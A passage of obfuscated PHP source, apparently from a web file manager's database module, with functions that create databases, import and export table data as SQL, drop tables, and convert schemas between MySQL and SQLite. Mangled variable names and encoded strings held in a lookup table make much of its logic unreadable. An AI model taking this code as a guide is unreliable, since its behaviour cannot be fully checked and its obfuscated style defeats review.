(isset($†òñ‡áŠ)) { think_cache($†òñ‡áŠ, $òÚßÀ¦·); } return $òÚßÀ¦·; } public function parseSql($úˆ–ÕÖ…, $Ş¥Á¦ƒ‡ = array()) { $¶¹ÊÔÃå =& $_SERVER[ì…™Î¶Ï]; $úˆ–ÕÖ… = str_replace(array($¶¹ÊÔÃå[1022], $¶¹ÊÔÃå[1023], $¶¹ÊÔÃå[1024], $¶¹ÊÔÃå[1025], $¶¹ÊÔÃå[1026], $¶¹ÊÔÃå[1027], $¶¹ÊÔÃå[1028], $¶¹ÊÔÃå[1029], $¶¹ÊÔÃå[1030], $¶¹ÊÔÃå[1031], $¶¹ÊÔÃå[1032]), array($this->parseTable("{$Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[274]]}"), $this->parseDistinct(isset($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[1033]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[1033]] : !1), $this->parseField(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[268]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[268]] : $¶¹ÊÔÃå[181]), $this->parseJoin(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[277]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[277]] : $¶¹ÊÔÃå[12]), $this->parseWhere(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[270]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[270]] : $¶¹ÊÔÃå[12]), $this->parseGroup(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[506]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[506]] : $¶¹ÊÔÃå[12]), $this->parseHaving(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[1034]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[1034]] : $¶¹ÊÔÃå[12]), $this->parseOrder(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[360]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[360]] : $¶¹ÊÔÃå[12]), $this->parseLimit(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[287]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[287]] : $¶¹ÊÔÃå[12]), $this->parseUnion(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[342]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[342]] : $¶¹ÊÔÃå[12]), $this->parseComment(!empty($Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[349]]) ? $Ş¥Á¦ƒ‡[$¶¹ÊÔÃå[349]] : $¶¹ÊÔÃå[12])), $úˆ–ÕÖ…); return $úˆ–ÕÖ…; } public function getLastSql($†•³„ñ¯ = '') { return $†•³„ñ¯ ? $this->modelSql[$†•³„ñ¯] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($à¦æ…ƒ’) { return addslashes($à¦æ…ƒ’); } public function setModel($²°»ù°) { $this->model = $²°»ù°; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($—ãÈºÆô = array()) { $€ÇÛ‘ =& $_SERVER[ì…™Î¶Ï]; if (empty($—ãÈºÆô)) { $—ãÈºÆô = $GLOBALS[$€ÇÛ‘[6]][$€ÇÛ‘[21]]; } $this->database = $—ãÈºÆô; } public function model($ªÇàÁã¹ = '') { return new ModelBase($ªÇàÁã¹, $_SERVER[ì…™Î¶Ï][12], $this->database); } public function db($ã±‚–• = false) { $ß®ÔÅ =& $_SERVER[ì…™Î¶Ï]; $«°¥Å®ò = array_change_key_case($this->database); if ($this->dbType() == $ß®ÔÅ[13] || !$ã±‚–•) { return $this->model()->db(); } $•ËÃ¿èå = $«°¥Å®ò[$ß®ÔÅ[948]]; $«°¥Å®ò[$ß®ÔÅ[948]] = $ß®ÔÅ[12]; if ($«°¥Å®ò[$ß®ÔÅ[943]] == $ß®ÔÅ[940]) { $€şãÀƒê = $«°¥Å®ò[$ß®ÔÅ[949]]; $«°¥Å®ò[$ß®ÔÅ[949]] = substr($€şãÀƒê, 0, strrpos($€şãÀƒê, $ß®ÔÅ[1035])); } $this->database = $«°¥Å®ò; $£Ø¹µ˜¼ = $this->model()->db(); try { $ß¡Ï‚ş§ = $£Ø¹µ˜¼->execute("\x73\x68\x6f\167\40\x64\141\x74\141\142\141\x73\145\x73\40\154\151\x6b\x65\40\x27{$•ËÃ¿èå}\x27"); } catch (Exception $©æÄ©“È) { } if (!$ß¡Ï‚ş§) { $£Ø¹µ˜¼->execute("\x63\x72\145\x61\x74\x65\x20\x64\x61\164\x61\x62\x61\163\145\x20\x60{$•ËÃ¿èå}\140"); } $«°¥Å®ò[$ß®ÔÅ[948]] = $•ËÃ¿èå; if ($«°¥Å®ò[$ß®ÔÅ[943]] == $ß®ÔÅ[940]) { $«°¥Å®ò[$ß®ÔÅ[949]] .= $ß®ÔÅ[1035] . $•ËÃ¿èå; } $this->database = $«°¥Å®ò; $£Ø¹µ˜¼->execute("\x75\163\145\x20\x60{$•ËÃ¿èå}\140"); return $£Ø¹µ˜¼; } public function createTable($¤ÆÇ³ĞÀ, &$“óÍøÉû) { $âùßåÃ† =& $_SERVER[ì…™Î¶Ï]; if (!IO::exist($¤ÆÇ³ĞÀ)) { ActionCall($âùßåÃ†[1036], !0, 0); show_json(LNG($âùßåÃ†[1037]), !1); } $×„ê¸‹ö = $this->model()->db(); $É“¸ûµ¯ = sqlSplit(IO::getContent($¤ÆÇ³ĞÀ)); foreach ($É“¸ûµ¯ as $“ä¿¼­«) { $ÄÁ ™°Ş = stripos($“ä¿¼­«, $âùßåÃ†[1038]) === 0; if ($ÄÁ ™°Ş) { $“óÍøÉû->task[$âùßåÃ†[761]] += 1; } $×„ê¸‹ö->execute($“ä¿¼­«); if ($ÄÁ ™°Ş) { preg_match($âùßåÃ†[1039], $“ä¿¼­«, $ó‰†åïë); $“óÍøÉû->task[$âùßåÃ†[1040]] = $ó‰†åïë[1]; $“óÍøÉû->update(1); } } } public function insertTable($Øç¯ì‘è, &$Ø’Ÿáøš) { $úàúÅÀ =& $_SERVER[ì…™Î¶Ï]; $û†‰Ä€ = $this->model()->db(); $ğ’†¸  = $óæ—´Íî ? array($óæ—´Íî) : $û†‰Ä€->getTables(); foreach ($Øç¯ì‘è as $ËåÍ×±Ş) { $óæ—´Íî = basename($ËåÍ×±Ş, $úàúÅÀ[763]); if (!in_array($óæ—´Íî, $ğ’†¸ )) { continue; } $Ø’Ÿáøš->task[$úàúÅÀ[1040]] = $óæ—´Íî; if (get_filesize($ËåÍ×±Ş) == 0) { continue; } $–Ì¼‘‰â = $this->sqlToDb($ËåÍ×±Ş, $Ø’Ÿáøš); if (!$–Ì¼‘‰â) { ActionCall($úàúÅÀ[1036], !0, 0); show_json(LNG($úàúÅÀ[1041]) . "\133{$óæ—´Íî}\x5d", !1); } } } public function sqlFromDb($Ñ ò÷µé, $°½ó‡øÁ, &$¿ôíıÎõ, $ÃáûíÎ· = '') { if ($¿ôíıÎõ) { $¿ôíıÎõ->task[$_SERVER[ì…™Î¶Ï][1040]] = $Ñ ò÷µé; } $Ò¯†Û¯ = $this->model($Ñ ò÷µé); $ÓÉø„­¨ = 0; $€Í„äëê = 0; $İôà½ö¥ = 10000; $×ºÌ‚İè = fopen($°½ó‡øÁ, $_SERVER[ì…™Î¶Ï][1042]); $®†÷¡× = $Ò¯†Û¯->getPk(); $ÛœéÙ†» = $Ò¯†Û¯->getDbFields(); $›î×ÍŞœ = $_SERVER[ì…™Î¶Ï][12]; if ($GLOBALS[$_SERVER[ì…™Î¶Ï][762]] && in_array($Ñ ò÷µé, array($_SERVER[ì…™Î¶Ï][1043], $_SERVER[ì…™Î¶Ï][1044]))) { $›î×ÍŞœ = $Ñ ò÷µé; } do { $ş»€şÎƒ = array($®†÷¡× => array($_SERVER[ì…™Î¶Ï][990], $€Í„äëê)); $»Ş”ÈÅÃ = $Ò¯†Û¯->where($ş»€şÎƒ)->field($ÛœéÙ†»)->order($®†÷¡× . $_SERVER[ì…™Î¶Ï][1045])->limit($İôà½ö¥)->select(); $»Ş”ÈÅÃ = !empty($»Ş”ÈÅÃ) ? $»Ş”ÈÅÃ : array(); if (!($ñ‹áÁ·± = count($»Ş”ÈÅÃ))) { break; } $²ÀªÔ— = end($»Ş”ÈÅÃ); $€Í„äëê = $²ÀªÔ—[$®†÷¡×]; $ÑôĞ×Úî = array(); foreach ($»Ş”ÈÅÃ as $¼˜ñÅ) { if ($›î×ÍŞœ) { if ($Ñ ò÷µé == $_SERVER[ì…™Î¶Ï][1043]) { if ($¼˜ñÅ[$_SERVER[ì…™Î¶Ï][33]] == $_SERVER[ì…™Î¶Ï][1046]) { $æÕªå¥ = json_decode($¼˜ñÅ[$_SERVER[ì…™Î¶Ï][369]], !0); if ($æÕªå¥[$_SERVER[ì…™Î¶Ï][32]] == $GLOBALS[$_SERVER[ì…™Î¶Ï][762]] && $æÕªå¥[$_SERVER[ì…™Î¶Ï][725]] != 1) { continue; } } } else { if ($¼˜ñÅ[$_SERVER[ì…™Î¶Ï][33]] == $_SERVER[ì…™Î¶Ï][1047] && $¼˜ñÅ[$_SERVER[ì…™Î¶Ï][95]] == $_SERVER[ì…™Î¶Ï][754]) { continue; } } } if ($ÃáûíÎ·) { $¼˜ñÅ[$_SERVER[ì…™Î¶Ï][78]] = "\173\151\157\x3a{$ÃáûíÎ·}\x7d" . substr($¼˜ñÅ[$_SERVER[ì…™Î¶Ï][78]], strlen("\173\x69\157\72{$¼˜ñÅ[$_SERVER[ì…™Î¶Ï][792]]}\175")); $¼˜ñÅ[$_SERVER[ì…™Î¶Ï][792]] = $ÃáûíÎ·; } $ÑôĞ×Úî[] = $_SERVER[ì…™Î¶Ï][1048] . $this->sqlEncode($¼˜ñÅ) . $_SERVER[ì…™Î¶Ï][1049]; } $Ö·°µ½õ = "\x49\x4e\x53\x45\122\124\x20\x49\116\124\117\40\140{$Ñ ò÷µé}\x60\40\x28\x60" . implode($_SERVER[ì…™Î¶Ï][1050], $ÛœéÙ†») . $_SERVER[ì…™Î¶Ï][1051]; fwrite($×ºÌ‚İè, $Ö·°µ½õ . implode($_SERVER[ì…™Î¶Ï][1052], $ÑôĞ×Úî) . $_SERVER[ì…™Î¶Ï][71] . PHP_EOL); $ÓÉø„­¨ += $ñ‹áÁ·±; if ($¿ôíıÎõ) { $¿ôíıÎõ->update($ñ‹áÁ·±); } } while ($İôà½ö¥ == $ñ‹áÁ·±); fclose($×ºÌ‚İè); return $ÓÉø„­¨; } public function sqlToDb($ô¶µğô, &$›Ö¡¨Ã¤) { $ßò´Öƒ¼ =& $_SERVER[ì…™Î¶Ï]; $ñœ§÷Ê½ = $this->model()->db(); $Õ¢Ÿ ı¯ = @fopen($ô¶µğô, $ßò´Öƒ¼[1053]); if (!$Õ¢Ÿ ı¯) { return !1; } $€¨½¡Ò = 0; $€¤Á Ä€ = $ßò´Öƒ¼[12]; $—Ùùº™ = array(); $ËŒí‚Á = $this->dbType(); $Ù€Ş•Ú« = $ËŒí‚Á == $ßò´Öƒ¼[13] ? 500 : 2000; $úß¬œşà = basename($ô¶µğô, $ßò´Öƒ¼[763]); $ıççä×ó = 0; $àÆÁ„ = 4194304 - 104858; $û»Ú¿ùô = 1000000 - 104858; while (!feof($Õ¢Ÿ ı¯)) { $‘ˆçœø  = trim(fgets($Õ¢Ÿ ı¯)); if (!$‘ˆçœø ) { continue; } $˜ÕÒÚî = $this->sqlDecode($‘ˆçœø , $ËŒí‚Á, $úß¬œşà); if (stripos($˜ÕÒÚî, $ßò´Öƒ¼[350]) === 0) { if (!$€¤Á Ä€) { $€¤Á Ä€ = $˜ÕÒÚî . $ßò´Öƒ¼[53]; } continue; } if ($›Ö¡¨Ã¤) { $›Ö¡¨Ã¤->task[$ßò´Öƒ¼[761]] += 1; } $€¨½¡Ò++; $—Ùùº™[] = rtrim(rtrim(trim($˜ÕÒÚî), $ßò´Öƒ¼[50]), $ßò´Öƒ¼[71]); $Õ¸²˜Šü = null; $ı´±íÔ™ = strlen($˜ÕÒÚî); $ıççä×ó += $ı´±íÔ™; if ($ıççä×ó >= ($Ù€Ş•Ú« == 500 ? $û»Ú¿ùô : $àÆÁ„)) { $Õ¸²˜Šü = array_pop($—Ùùº™); if ($€¨½¡Ò > 1) { $€¨½¡Ò--; } } if ($€¨½¡Ò >= $Ù€Ş•Ú« || $Õ¸²˜Šü) { $˜ÕÒÚî = $€¤Á Ä€ . implode($ßò´Öƒ¼[50], $—Ùùº™); if (!$ñœ§÷Ê½->execute($˜ÕÒÚî)) { return !1; } if ($›Ö¡¨Ã¤) { $›Ö¡¨Ã¤->update($€¨½¡Ò); } $—Ùùº™ = array(); $€¨½¡Ò = 0; $ıççä×ó = 0; if ($Õ¸²˜Šü) { $—Ùùº™ = array($Õ¸²˜Šü); $€¨½¡Ò = 1; $ıççä×ó = $ı´±íÔ™; } } } fclose($Õ¢Ÿ ı¯); if (!empty($—Ùùº™)) { $˜ÕÒÚî = $€¤Á Ä€ . implode($ßò´Öƒ¼[50], $—Ùùº™); if (!$ñœ§÷Ê½->execute($˜ÕÒÚî)) { return !1; } if ($›Ö¡¨Ã¤) { $›Ö¡¨Ã¤->update($€¨½¡Ò); } } return !0; } public function dropTable($“İÄÉØ» = null) { $‚½õ‚Ïƒ = $this->model()->db(); $ßüÂÓ£» = $“İÄÉØ» ? array($“İÄÉØ») : $‚½õ‚Ïƒ->getTables(); if (!$ßüÂÓ£») { return; } foreach ($ßüÂÓ£» as $“İÄÉØ») { if ($“İÄÉØ») { $“İÄÉØ» = strtolower($“İÄÉØ»); } else { continue; } $‚½õ‚Ïƒ->execute("\144\x72\x6f\160\x20\164\141\142\x6c\x65\x20\151\146\40\145\170\x69\x73\164\163\x20\x60{$“İÄÉØ»}\140"); } } private function sqlEncode($µå‡„ù) { $ôª´Îó =& $_SERVER[ì…™Î¶Ï]; $ƒ§¸” = array(); foreach ($µå‡„ù as $˜ÁÓÀú¡) { if (is_array($˜ÁÓÀú¡)) { $˜ÁÓÀú¡ = json_encode_force($˜ÁÓÀú¡); } $˜ÁÓÀú¡ = addslashes($˜ÁÓÀú¡); $˜ÁÓÀú¡ = str_replace(array($ôª´Îó[1054], $ôª´Îó[226]), array($ôª´Îó[1055], $ôª´Îó[1056]), $˜ÁÓÀú¡); $ƒ§¸”[] = str_replace($ôª´Îó[58], $ôª´Îó[1057], $˜ÁÓÀú¡); } return $ôª´Îó[58] . implode($ôª´Îó[1058], $ƒ§¸”) . $ôª´Îó[58]; } private function sqlDecode($ğ¦¤çœ¸, $ĞÇñĞò†, $îˆìäì = '') { $¥Ÿ÷ÀÒ =& $_SERVER[ì…™Î¶Ï]; $ğ¦¤çœ¸ = str_replace(array($¥Ÿ÷ÀÒ[1055], $¥Ÿ÷ÀÒ[1056]), array($¥Ÿ÷ÀÒ[1054], $¥Ÿ÷ÀÒ[226]), $ğ¦¤çœ¸); if ($ĞÇñĞò† == $¥Ÿ÷ÀÒ[13]) { return $îˆìäì != $¥Ÿ÷ÀÒ[1059] ? stripslashes($ğ¦¤çœ¸) : $ğ¦¤çœ¸; } if ($îˆìäì == $¥Ÿ÷ÀÒ[1059]) { $ğ¦¤çœ¸ = str_replace($¥Ÿ÷ÀÒ[1060], $¥Ÿ÷ÀÒ[117], stripslashes($ğ¦¤çœ¸)); } return $ğ¦¤çœ¸; } public function getSqlFile($”Šá±ø® = '') { $Áîîø =& $_SERVER[ì…™Î¶Ï]; $¯µÍÖÑ = $this->dbType(!0); $ êÁÍ½Ê = CONTROLLER_DIR . "\151\156\x73\x74\141\154\154\57\x64\141\x74\x61\x2f{$¯µÍÖÑ}\x2e\x73\161\154"; $ë¬§Ø½† = file_get_contents($ êÁÍ½Ê); $¨»èª˜ = $Áîîø[1061] . ($¯µÍÖÑ == $Áîîø[779] ? $Áîîø[1062] : $Áîîø[1063]) . $Áîîø[1064]; preg_match_all($¨»èª˜, $ë¬§Ø½†, $¡ğ²ë¹); $íØµÑ¦¯ = $¡ğ²ë¹[1]; $ÚãÇ¨ìê = $this->model()->db(); $Ì•Ó—‚÷ = $ÚãÇ¨ìê->getTables(); $Ö»¤¼’¡ = TEMP_FILES . $Áîîø[1065] . date($Áîîø[726]) . $Áîîø[8]; del_dir($Ö»¤¼’¡); mk_dir($Ö»¤¼’¡); $•ı®¤‹ = $Ö»¤¼’¡ . $Áîîø[1066]; $È¦‡®éÃ = $Ö»¤¼’¡ . $Áîîø[1067]; $Ä«ÉŸºÉ = $¯µÍÖÑ == $Áîîø[13] ? $Áîîø[779] : $Áîîø[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\141\x6c\154\x2f\x64\x61\x74\x61\x2f{$Ä«ÉŸºÉ}\x2e\163\161\154", $Ö»¤¼’¡); @touch($Ö»¤¼’¡ . $¯µÍÖÑ . $Áîîø[763]); $ˆ££ıÜÍ = fopen($•ı®¤‹, $Áîîø[1042]); $­ÈŞù‘ı = fopen($È¦‡®éÃ, $Áîîø[1042]); if ($¯µÍÖÑ == $Áîîø[13]) { $Ì•Ó—‚÷ = array_diff($Ì•Ó—‚÷, array($Áîîø[759], $Áîîø[760])); $©š€„úª = array($Áîîø[1068], $Áîîø[1069], $Áîîø[1070]); fwrite($­ÈŞù‘ı, implode(PHP_EOL, $©š€„úª) . PHP_EOL . PHP_EOL); foreach ($Ì•Ó—‚÷ as $ …òİ“¤) { $‘•ò¦€­ = $this->sqlFromSqlite($ …òİ“¤); if (!$‘•ò¦€­[$Áîîø[13]]) { continue; } fwrite($­ÈŞù‘ı, $‘•ò¦€­[$Áîîø[13]] . PHP_EOL . PHP_EOL); if (!in_array($ …òİ“¤, $íØµÑ¦¯)) { fwrite($ˆ££ıÜÍ, $‘•ò¦€­[$Áîîø[779]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ì•Ó—‚÷ as $ …òİ“¤) { $‘•ò¦€­ = $this->sqlFromMysql($ …òİ“¤); if (!$‘•ò¦€­[$Áîîø[779]]) { continue; } fwrite($ˆ££ıÜÍ, $‘•ò¦€­[$Áîîø[779]] . PHP_EOL . PHP_EOL); if (!in_array($ …òİ“¤, $íØµÑ¦¯)) { fwrite($­ÈŞù‘ı, $‘•ò¦€­[$Áîîø[13]] . PHP_EOL . PHP_EOL); } } } fclose($ˆ££ıÜÍ); fclose($­ÈŞù‘ı); $ë¬§Ø½† = array($Áîîø[779] => $•ı®¤‹, $Áîîø[13] => $È¦‡®éÃ); return $”Šá±ø® ? $ë¬§Ø½†[$”Šá±ø®] : $ë¬§Ø½†; } public function dbType($»Èíúê§ = false) { $Ö·‚„ =& $_SERVER[ì…™Î¶Ï]; $ã™òûöƒ = $»Èíúê§ ? $GLOBALS[$Ö·‚„[6]][$Ö·‚„[21]] : $this->database; $ã™òûöƒ = array_change_key_case($ã™òûöƒ); $š©êÄñø = $ã™òûöƒ[$Ö·‚„[943]]; if ($š©êÄñø == $Ö·‚„[940]) { $†‹ğ¸Ûû = explode($Ö·‚„[4], $ã™òûöƒ[$Ö·‚„[949]]); $š©êÄñø = $†‹ğ¸Ûû[0]; } $™§ı‘ß– = array($Ö·‚„[1071] => $Ö·‚„[13], $Ö·‚„[888] => $Ö·‚„[779]); if (isset($™§ı‘ß–[$š©êÄñø])) { $š©êÄñø = $™§ı‘ß–[$š©êÄñø]; } return $š©êÄñø; } public function sqlFromMysql($‘¹Œé¶Ş, $Éê“„åã = '') { $†¡áØ‡’ =& $_SERVER[ì…™Î¶Ï]; $ŠÀı¸ªƒ = $this->model()->db(); $¹œ¹¢‚Ê = $ŠÀı¸ªƒ->query($†¡áØ‡’[1072] . $‘¹Œé¶Ş . $†¡áØ‡’[380]); if (!$¹œ¹¢‚Ê || !$¹œ¹¢‚Ê[0]) { return !1; } $Æ¹·ÑÎ± = _get($¹œ¹¢‚Ê[0], $†¡áØ‡’[1073], $†¡áØ‡’[12]); if (!$Æ¹·ÑÎ±) { return !1; } $ºóøÀÙ = "\104\122\117\120\x20\124\101\x42\114\105\x20\111\106\x20\x45\x58\111\x53\x54\123\40\140{$‘¹Œé¶Ş}\140\73" . PHP_EOL . $Æ¹·ÑÎ± . $†¡áØ‡’[71]; if ($Éê“„åã && $Éê“„åã == $†¡áØ‡’[779]) { return $ºóøÀÙ; } $¦°ï°šË = array_change_key_case($GLOBALS[$†¡áØ‡’[6]][$†¡áØ‡’[21]]); $â­¨â¬ñ = $¦°ï°šË[$†¡áØ‡’[948]]; $‘õ™—¢‚ = $†¡áØ‡’[1074] . $â­¨â¬ñ . $†¡áØ‡’[1075] . $‘¹Œé¶Ş . $†¡áØ‡’[58]; $¨”ªë½¸ = $†¡áØ‡’[1076] . $‘¹Œé¶Ş . $†¡áØ‡’[876]; $äŸğ¥£ = $ŠÀı¸ªƒ->query($‘õ™—¢‚); if (empty($äŸğ¥£)) { $È°ã…ü = array($†¡áØ‡’[779] => $†¡áØ‡’[12], $†¡áØ‡’[13] => $†¡áØ‡’[12]); return $Éê“„åã ? $È°ã…ü[$Éê“„åã] : $È°ã…ü; } $›ÑŸ­¦Ö = $ŠÀı¸ªƒ->query($¨”ªë½¸); $õ…ÚÂó§ = $†¡áØ‡’[12]; $³óÎŞ˜† = array(); foreach ($›ÑŸ­¦Ö as $’î‰º²·) { if (!$õ…ÚÂó§ && $’î‰º²·[$†¡áØ‡’[1077]] == $†¡áØ‡’[1078]) { $õ…ÚÂó§ = $’î‰º²·[$†¡áØ‡’[1079]]; } if (isset($³óÎŞ˜†[$’î‰º²·[$†¡áØ‡’[1077]]])) { $³óÎŞ˜†[$’î‰º²·[$†¡áØ‡’[1077]]][$†¡áØ‡’[1080]][] = $’î‰º²·[$†¡áØ‡’[1079]]; continue; } $³óÎŞ˜†[$’î‰º²·[$†¡áØ‡’[1077]]] = array($†¡áØ‡’[1081] => $’î‰º²·[$†¡áØ‡’[1077]], $†¡áØ‡’[1080] => array($’î‰º²·[$†¡áØ‡’[1079]]), $†¡áØ‡’[1082] => $’î‰º²·[$†¡áØ‡’[1083]] == $†¡áØ‡’[89] ? 0 : 1); } $ÖŞ‘Óø± = array(); foreach ($³óÎŞ˜† as $’î‰º²·) { $’ûôá‡ = $’î‰º²·[$†¡áØ‡’[1081]] == $†¡áØ‡’[1078]; $ã„½ú¼ë = array($†¡áØ‡’[1084], $’î‰º²·[$†¡áØ‡’[1082]] == $†¡áØ‡’[89] && !$’ûôá‡ ? $†¡áØ‡’[1085] : $†¡áØ‡’[12], $†¡áØ‡’[1086], $†¡áØ‡’[1087] . $‘¹Œé¶Ş . $†¡áØ‡’[11] . ($’ûôá‡ ? $†¡áØ‡’[1088] : $’î‰º²·[$†¡áØ‡’[1081]]) . $†¡áØ‡’[117], $†¡áØ‡’[1089], $†¡áØ‡’[117] . $‘¹Œé¶Ş . $†¡áØ‡’[117], $†¡áØ‡’[1090] . implode($†¡áØ‡’[1091], $’î‰º²·[$†¡áØ‡’[1080]]) . $†¡áØ‡’[1092]); $ÖŞ‘Óø±[] = implode($†¡áØ‡’[53], $ã„½ú¼ë) . $†¡áØ‡’[71]; } $ËÎåÔéğ = array(); $àŒ§ãè = array($†¡áØ‡’[1093] => $†¡áØ‡’[1094], $†¡áØ‡’[1094] => $†¡áØ‡’[1094], $†¡áØ‡’[283] => $†¡áØ‡’[310], $†¡áØ‡’[282] => $†¡áØ‡’[310]); foreach ($äŸğ¥£ as $’î‰º²·) { $ã„½ú¼ë = array($†¡áØ‡’[117] . $’î‰º²·[$†¡áØ‡’[1095]] . $†¡áØ‡’[117], isset($àŒ§ãè[$’î‰º²·[$†¡áØ‡’[1096]]]) ? $àŒ§ãè[$’î‰º²·[$†¡áØ‡’[1096]]] : $’î‰º²·[$†¡áØ‡’[1097]], $’î‰º²·[$†¡áØ‡’[1098]] == $†¡áØ‡’[874] ? $†¡áØ‡’[1099] : $†¡áØ‡’[1100], $’î‰º²·[$†¡áØ‡’[1095]] == $õ…ÚÂó§ ? $†¡áØ‡’[1101] : $†¡áØ‡’[12], $’î‰º²·[$†¡áØ‡’[925]] ? strtoupper(str_replace($†¡áØ‡’[11], $†¡áØ‡’[12], $’î‰º²·[$†¡áØ‡’[925]])) : $†¡áØ‡’[12]); $ËÎåÔéğ[] = trim(implode($†¡áØ‡’[53], $ã„½ú¼ë)); } $úÏ¿ŒÚ÷ = array($†¡áØ‡’[1102] . $‘¹Œé¶Ş . $†¡áØ‡’[1103], $†¡áØ‡’[1104] . $‘¹Œé¶Ş . $†¡áØ‡’[1105], implode($†¡áØ‡’[50] . PHP_EOL, $ËÎåÔéğ), $†¡áØ‡’[922]); $‹¸¿ÊÄ = implode(PHP_EOL, array_merge($úÏ¿ŒÚ÷, $ÖŞ‘Óø±)); if ($Éê“„åã && $Éê“„åã == $†¡áØ‡’[13]) { return $‹¸¿ÊÄ; } $È°ã…ü = array($†¡áØ‡’[779] => $ºóøÀÙ, $†¡áØ‡’[13] => $‹¸¿ÊÄ); return $Éê“„åã ? $È°ã…ü[$Éê“„åã] : $È°ã…ü; } public function sqlFromSqlite($¤—ÙÓà½, $åäüöÎõ = '') { $‡âÉìîà =& $_SERVER[ì…™Î¶Ï]; $‡»ö“€¢ = $this->model()->db(); $°Æô¶ŠÎ = "\120\x52\x41\x47\x4d\101\x20\x54\101\x42\x4c\x45\137\x49\x4e\x46\117\40\50\x27{$¤—ÙÓà½}\47\x29"; $¶ÂÔ¿Õ = "\x53\x45\114\105\x43\124\x20\52\x20\106\x52\x4f\115\40\163\x71\x6c\151\x74\145\x5f\x6d\x61\x73\164\145\x72\40\x57\x48\105\x52\105\x20\x74\142\154\137\156\x61\155\145\40\x3d\x20\47{$¤—ÙÓà½}\47"; $Ø˜âÌ˜œ = $‡»ö“€¢->query($°Æô¶ŠÎ); if (empty($Ø˜âÌ˜œ)) { $Œ²Õª¢ = array($‡âÉìîà[779] => $‡âÉìîà[12], $‡âÉìîà[13] => $‡âÉìîà[12]); return $åäüöÎõ ? $Œ²Õª¢[$åäüöÎõ] : $Œ²Õª¢; } $çı€€› = $‡»ö“€¢->query($¶ÂÔ¿Õ); $®î³€ö± = $‚’º¼İ = array(); foreach ($çı€€› as $óûæ‘–Œ) { if ($óûæ‘–Œ[$‡âÉìîà[33]] == $‡âÉìîà[274]) { $®î³€ö±[] = $óûæ‘–Œ[$‡âÉìîà[1106]]; } else { $‚’º¼İ[$óûæ‘–Œ[$‡âÉìîà[32]]] = $óûæ‘–Œ[$‡âÉìîà[1106]]; } } $ÓÇ¸ñğ¨ = array_merge(array($‡âÉìîà[1102] . $¤—ÙÓà½ . $‡âÉìîà[117]), $®î³€ö±, array_values($‚’º¼İ)); $ÓÇ¸ñğ¨ = implode($‡âÉìîà[71] . PHP_EOL, $ÓÇ¸ñğ¨) . $‡âÉìîà[71]; if ($åäüöÎõ && $åäüöÎõ == $‡âÉìîà[13]) { return $ÓÇ¸ñğ¨; } $ÎÇúáüÌ = array(); $‰Æ“õ° = array($‡âÉìîà[1094] => $‡âÉìîà[1107], $‡âÉìîà[310] => $‡âÉìîà[1108]); $‰»È¼¬İ = $‡âÉìîà[12]; foreach ($Ø˜âÌ˜œ as $óûæ‘–Œ) { if ($óûæ‘–Œ[$‡âÉìîà[57]] == $‡âÉìîà[89]) { $‰»È¼¬İ = $óûæ‘–Œ[$‡âÉìîà[32]]; } $¶£ïğ£ç = array($‡âÉìîà[380] . $óûæ‘–Œ[$‡âÉìîà[32]] . $‡âÉìîà[380], isset($‰Æ“õ°[$óûæ‘–Œ[$‡âÉìîà[33]]]) ? $‰Æ“õ°[$óûæ‘–Œ[$‡âÉìîà[33]]] : $óûæ‘–Œ[$‡âÉìîà[33]], $óûæ‘–Œ[$‡âÉìîà[35]] == $‡âÉìîà[89] ? $‡âÉìîà[1099] : $‡âÉìîà[1109] . $óûæ‘–Œ[$‡âÉìîà[56]], $óûæ‘–Œ[$‡âÉìîà[57]] == $‡âÉìîà[89] ? $‡âÉìîà[1110] : $‡âÉìîà[12]); $ÎÇúáüÌ[] = trim(implode($‡âÉìîà[53], $¶£ïğ£ç)); } foreach ($‚’º¼İ as $ôÚ•¾¦İ => $”‡­ÕÚÏ) { $Œ§Èœé„ = str_replace($‡âÉìîà[1111] . $¤—ÙÓà½ . $‡âÉìîà[11], $‡âÉìîà[12], $ôÚ•¾¦İ); $şÏî˜ = str_replace(array($‡âÉìîà[117], $‡âÉìîà[933]), $‡âÉìîà[380], substr($”‡­ÕÚÏ, stripos($”‡­ÕÚÏ, $‡âÉìîà[255]))); if ($Œ§Èœé„ == $‡âÉìîà[1088]) { $¿¿ØÌ = $‡âÉìîà[1112] . $‰»È¼¬İ . $‡âÉìîà[1113]; } else { $¿¿ØÌ = (stripos($Œ§Èœé„, $‡âÉìîà[11]) ? $‡âÉìîà[1114] : $‡âÉìîà[12]) . ($‡âÉìîà[1115] . $Œ§Èœé„ . $‡âÉìîà[1116] . $şÏî˜); } $ÎÇúáüÌ[] = $¿¿ØÌ; } $£éî€İì = array($‡âÉìîà[1117] . $¤—ÙÓà½ . $‡âÉìîà[1118], $‡âÉìîà[1119] . $¤—ÙÓà½ . $‡âÉìîà[1120], implode($‡âÉìîà[50] . PHP_EOL, $ÎÇúáüÌ), $‡âÉìîà[1121]); $ò£³›ª¾ = implode(PHP_EOL, $£éî€İì); if ($åäüöÎõ && $åäüöÎõ == $‡âÉìîà[779]) { return $ò£³›ª¾; } $Œ²Õª¢ = array($‡âÉìîà[779] => 